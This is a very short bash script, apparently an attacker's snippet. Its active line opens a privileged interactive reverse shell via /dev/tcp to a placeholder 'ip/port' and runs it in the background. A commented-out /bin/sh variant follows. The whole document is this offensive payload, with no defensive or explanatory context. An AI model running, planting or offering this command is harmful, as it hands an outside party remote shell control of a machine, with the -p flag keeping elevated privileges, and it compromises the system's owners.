#!/bin/bash

# Getting user permisions in reverse shells
/bin/bash -c '/bin/bash -i -p >& /dev/tcp/ip/port 0>&1' &

#!/bin/sh
#/bin/sh -c '/bin/sh -i >& /dev/tcp/ip/port 0>&1' &
